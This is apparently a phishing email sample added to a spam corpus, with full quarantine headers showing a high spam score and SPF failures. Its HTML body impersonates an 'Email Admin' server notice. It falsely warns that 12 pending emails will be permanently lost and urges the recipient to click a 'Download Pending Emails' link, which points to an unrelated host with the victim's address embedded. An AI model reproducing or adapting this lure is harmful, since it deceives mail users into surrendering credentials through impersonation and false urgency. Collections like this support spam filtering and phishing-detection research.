@@ -1,0 +1,71 @@
+Return-Path: <noreply@security.com>
+Delivered-To: spam-quarantine
+X-Envelope-To: <info@jcbl.com>
+X-Envelope-To-Blocked: <info@jcbl.com>
+X-Quarantine-ID: <aKRRiWHfipFk>
+X-Spam-Flag: YES
+X-Spam-Score: 12.554
+X-Spam-Level: ************
+X-Spam-Status: Yes, score=12.554 tag=2 tag2=6.31 kill=6.31
+	tests=[DEAR_EMAIL=0.001, HTML_FONT_SIZE_HUGE=0.001,
+	HTML_MESSAGE=0.001, MIME_HTML_ONLY=1.105,
+	RAZOR2_CF_RANGE_51_100=0.365, RAZOR2_CF_RANGE_E8_51_100=2.43,
+	RAZOR2_CHECK=1.729, RCVD_IN_RP_RNBL=1.284, RDNS_NONE=1.274,
+	SPF_FAIL=0.919, SPF_HELO_FAIL=0.001, TO_IN_SUBJ=1.494,
+	TO_NO_BRKTS_NORDNS=0.001, TO_NO_BRKTS_NORDNS_HTML=0.001,
+	URIBL_JP_SURBL=1.948] autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id aKRRiWHfipFk for <info@jcbl.com>;
+	Wed, 21 Nov 2018 22:19:31 +0530 (IST)
+Received: from security.com (unknown [185.62.189.131])
+	by mx10.jcbl.com (Postfix) with ESMTP id 715A8F4B947
+	for <info@jcbl.com>; Wed, 21 Nov 2018 20:42:35 +0530 (IST)
+From: Email Admin <noreply@security.com>
+To: info@jcbl.com
+Subject: info@jcbl.com NOTIFICATION - You Have 12 Pending Emails
+Date: 21 Nov 2018 07:13:25 -0800
+Message-ID: <20181121071325.9B429CBEEA7E4456@security.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html xmlns=3D"http://www.w3.org/1999/xhtml"><head><meta http-equiv=3D"Cont=
+ent-Type" content=3D"text/html; charset=3Diso-8859-1" /></head><body><table=
+ width=3D"100%" height=3D"" align=3D"center"><br> <td width=3D"10%"></td> <=
+td width=3D"70%" bgcolor=3D""> <table style=3D"border: solid 1px #A4A4A4;" =
+cellspacing=3D"0"><tr><td> <table width=3D"100%" cellspacing=3D"0"> <tr><td=
+ bgcolor=3D"#045FB4" height=3D"110"> <br> <table width=3D"80%" align=3D"cen=
+ter"><tr>  <td> <font face=3D"calibri" size=3D"+4" color=3D"#ffffff"> Serve=
+r Message </font> </td></tr></table> </td></tr> <tr><td bgcolor=3D"#F8F8F8"=
+ height=3D""> <br><br> <table width=3D"80%" align=3D"center"><tr><td><h3><s=
+trong>Dear info@jcbl.com</strong></h3>          <h3>You have pending emails=
+ left on the server. These emails have not been properly synced with your m=
+ailbox. To retrieve your pending emails click below</h3></td></tr></table> =
+</td></tr> <tr><td height=3D"15" bgcolor=3D"#F8F8F8"></td></tr> <tr><td bgc=
+olor=3D"#F8F8F8"> <table width=3D"80%" bgcolor=3D"#045FB4" height=3D"60" al=
+ign=3D"center"><tr><td> <div align=3D"center"> <a href=3D"http://empero.una=
+ux.com/en/index.php?email=3Dinfo@jcbl.com" target=3D"_blank" style=3D"text-=
+decoration:none"> <font face=3D"calibri" size=3D"+2" color=3D"#ffffff"> Dow=
+nload Pending Emails </font> </a> </div> </td></tr></table> </td></tr> <tr>=
+<td height=3D"20" bgcolor=3D"#F8F8F8"></td></tr> <tr><td bgcolor=3D"#F8F8F8=
+" height=3D"70"> <table width=3D"80%" align=3D"center"><tr>                =
+          <td><h3><br>                            However, if you do not re=
+trieve your pending emails now, they may be lost for ever. and all your ema=
+il data will be lost permanently.<font face=3D"calibri" size=3D"3" color=3D=
+"">                            </font></h3>                            <fon=
+t face=3D"calibri" size=3D"3" color=3D"">&nbsp;                            =
+</font><p><font size=3D"3" face=3D"calibri">.<br>                          =
+     <b>Email Admin Team </b>                             </font>          =
+             </td></tr></table> </td></tr> <tr><td height=3D"10" bgcolor=3D=
+"#F8F8F8"></td></tr> <tr><td height=3D"0" bgcolor=3D"#F8F8F8"> <table width=
+=3D"80%" height=3D"10" align=3D"center"><tr><td> <hr width=3D"100%" align=
+=3D"center"> </td></tr></table> </td></tr> <tr><td bgcolor=3D"#F8F8F8"> <ta=
+ble width=3D"80%" height=3D"" align=3D"center"><tr><td> <font face=3D"calib=
+ri" size=3D"2"> This message is auto-generated from E-mail security server,=
+ and replies sent to this email can not be delivered. <br> This email is me=
+ant for: <b><font color=3D"#045FB4">info@jcbl.com</font></b> </font> </td> =
+                                   </tr></table> </td></tr> <tr><td height=
+=3D"30" bgcolor=3D"#F8F8F8"></td></tr> </table> </td></tr></table> </td> <t=
+d width=3D"20%"></td> </tr></table></body></html>
